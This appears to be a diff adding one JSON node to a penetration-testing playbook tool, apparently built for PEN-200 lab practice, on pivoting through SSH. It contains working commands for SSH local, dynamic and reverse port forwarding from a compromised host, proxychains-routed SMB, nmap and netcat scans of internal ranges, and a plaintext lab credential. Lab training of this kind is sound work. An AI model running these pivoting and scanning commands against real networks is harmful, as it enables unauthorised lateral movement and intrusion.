@@ -1,0 +1,18 @@
+{
+  "id": "ssh_tunnel",
+  "phase": "PIVOT",
+  "title": "SSH Tunnel",
+  "body": "SSH creds to the pivot means no binary uploads needed. Dynamic -D gives a full SOCKS5 proxy for proxychains.",
+  "cmd": "# ── SSH LOCAL PORT FORWARD ───────────────────────────\n# Maps ONE port through the tunnel\n# Run ON the pivot host (e.g. confluence01)\n# Format: -L [local_ip:]local_port:dest_ip:dest_port\n\n# Forward local port 4455 on pivot → SMB on internal host\nssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215\n# Then from Kali: smbclient -p 4455 //[pivot_external_ip]/ -U hr_admin\n\n# Forward local port 2345 on pivot → PostgreSQL on internal host\nssh -N -L 0.0.0.0:2345:10.4.50.215:5432 database_admin@10.4.50.215\n# Then from Kali: psql -h [pivot_ip] -p 2345 -U postgres\n\n# Forward local port 2222 on pivot → SSH on internal host\nssh -N -L 0.0.0.0:2222:10.4.50.215:22 database_admin@10.4.50.215\n# Then from Kali: ssh database_admin@[pivot_ip] -p 2222\n\n# ── SSH DYNAMIC PORT FORWARD (SOCKS PROXY) ───────────\n# Maps ALL ports through ONE listening SOCKS port\n# Run ON the pivot host\nssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215\n\n# Configure proxychains on Kali:\n# Edit /etc/proxychains4.conf — add at bottom:\n# socks5 [pivot_external_ip] 9999\n\n# Then use proxychains to route any tool through:\nproxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234\nproxychains nmap -sT -Pn -n --top-ports=20 172.16.50.217\nproxychains curl http://172.16.50.100:8080\n\n# Speed up proxychains nmap (lower timeouts in config):\n# tcp_read_time_out 800\n# tcp_connect_time_out 700\n\n# ⚠️  PROXYCHAINS + NMAP LIMITATION — ports may show \"filtered\"\n# even when open (curl/nc works fine through same proxy)\n# Known issue: proxychains cannot hook nmaps raw socket operations\n# Try --unprivileged flag first:\nproxychains nmap -sT -Pn -n --unprivileged --top-ports=20 $ip\n\n# If still failing — use nc loop instead:\nfor port in $(seq 1 1024); do\n  proxychains nc -zv -w1 $ip $port 2>&1 | grep -i \"open|succeeded|connected\"\ndone\n\n# Specific range scan (faster):\nfor port in $(seq 9050 9100); do\n  proxychains nc -zv -w1 $ip $port 2>&1 | grep -i \"open|succeeded|connected\"\ndone\n# Lab validated: PEN-200 Module 19 SSH remote dynamic lab\n# Found port 9062 open on MULTISERVER03 this way\n\n# ── SSH REMOTE PORT FORWARD ───────────────────────────\n# Use when pivot host can reach Kali but Kali can't reach pivot\n# Run ON the pivot host — connects OUT to Kali, creates listener on Kali\nssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@[kali_ip]\n# Kali now has port 2345 locally → connects to internal postgres\n\n# ── SSH REMOTE DYNAMIC (REVERSE SOCKS) ───────────────\n# Run ON the pivot host — creates SOCKS proxy ON Kali\nssh -N -R 9998 kali@[kali_ip]\n# Add to /etc/proxychains4.conf: socks5 127.0.0.1 9998\n# Then: proxychains nmap -sT -Pn 172.16.50.0/24\n\n# ── CONFIRM TUNNEL IS UP ─────────────────────────────\nss -ntplu | grep 4455   # check listening on pivot\nss -ntplu | grep 9999   # check SOCKS proxy port\n\n# ── GOTCHAS ───────────────────────────────────────────\n# -N = no shell opened (normal — no output after password)\n# \"Could not create directory /home/x/.ssh\" = harmless warning\n# \"Failed to add host to known_hosts\" = harmless warning\n# Port must be > 1024 if running as non-root\n# -v flag for debug output if tunnel fails",
+  "warn": "proxychains + nmap: always -sT. Never -sS through SOCKS — it will hang.",
+  "choices": [
+    {
+      "label": "SOCKS proxy up — discover internal hosts",
+      "next": "pivot_discovery"
+    },
+    {
+      "label": "Port forward set — scan specific service",
+      "next": "pivot_portscan"
+    }
+  ]
+}
